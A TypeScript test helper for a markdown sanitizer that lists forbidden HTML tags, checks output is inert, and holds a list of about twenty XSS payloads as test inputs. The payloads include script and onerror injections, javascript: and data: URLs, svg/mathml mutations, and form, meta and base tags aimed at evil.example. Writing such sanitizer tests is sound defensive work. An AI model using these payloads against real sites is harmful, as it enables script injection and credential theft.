// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

// What a sanitized README may and may not contain, shared by the unit tests
// over the markdown processor and the build test over real pages. Judged on a
// parsed tree: escaped payload text such as `&lt;img onerror=…&gt;` is inert
// and legitimately survives, so a substring search would call it a failure.
import { expect } from "vitest";
import { elements } from "./html.js";

/** Elements that run code, load a document, or restyle the page — none may survive. */
const FORBIDDEN_TAGS = new Set([
  "script",
  "iframe",
  "frame",
  "frameset",
  "object",
  "embed",
  "applet",
  "form",
  "button",
  "textarea",
  "select",
  "meta",
  "base",
  "link",
  "style",
  "svg",
  "math",
  "template",
  "noscript",
]);

/** A URL with the whitespace and control characters a browser ignores removed. */
const urlOf = (value: string) => value.replace(/[\u0000-\u0020\u007f-\u009f]/g, "").toLowerCase();

/** Everything the output must never contain, whatever the payload was. */
export function expectInert(html: string): void {
  for (const el of elements(html)) {
    expect(FORBIDDEN_TAGS.has(el.tagName), `<${el.tagName}>`).toBe(false);
    for (const { name, value } of el.attrs) {
      expect(name, `${el.tagName} attribute`).not.toMatch(/^on/);
      expect(name, `${el.tagName} attribute`).not.toBe("style");
      expect(urlOf(value), `${el.tagName} ${name}`).not.toMatch(/^(javascript|vbscript|data):/);
    }
  }
}

/** One case per payload; `name` is what the case reports under. */
export const HOSTILE: [name: string, markdown: string][] = [
  ["script element", "<script>alert(1)</script>"],
  ["img onerror", "<img src=x onerror=alert(1)>"],
  ["markdown javascript: link", "[md-js](javascript:alert(1))"],
  [
    "javascript: href spellings",
    '<a href="javascript:alert(1)">a</a> <a href="JaVaScRiPt:alert(1)">b</a> <a href="&#106;avascript:alert(1)">c</a> <a href=" javascript:alert(1)">d</a> <a href="java&#x09;script:alert(1)">e</a> <a href="vbscript:msgbox(1)">f</a>',
  ],
  ["svg onload", "<svg onload=alert(1)><circle r=1></svg>"],
  ["svg script", "<svg><script>alert(1)</script></svg>"],
  ["svg xlink:href", '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
  ["data: link", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data</a>'],
  ["data: image", "![d](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)"],
  ["iframe", '<iframe src="javascript:alert(1)"></iframe> <iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["object and embed", '<object data="x.swf"></object> <embed src="x.swf">'],
  ["style element and style attribute", '<style>body{display:none}</style> <div style="position:fixed;inset:0">overlay</div>'],
  [
    "form",
    '<form action="https://evil.example/"><input name="password"><button formaction="https://evil.example/">go</button></form>',
  ],
  [
    "meta, base and link",
    '<meta http-equiv="refresh" content="0;url=https://evil.example/"> <base href="https://evil.example/"> <link rel="stylesheet" href="https://evil.example/x.css">',
  ],
  ["math/mglyph mutation", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"],
  ["details ontoggle", "<details open ontoggle=alert(1)><summary>s</summary></details>"],
  ["input autofocus", "<input autofocus onfocus=alert(1)>"],
  ["template script", "<template><script>alert(1)</script></template>"],
  ["noscript breakout", '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ["DOM clobbering", '<img name="querySelectorAll" src="https://example.com/a.png"> <a id="Astro">clobber</a>'],
];
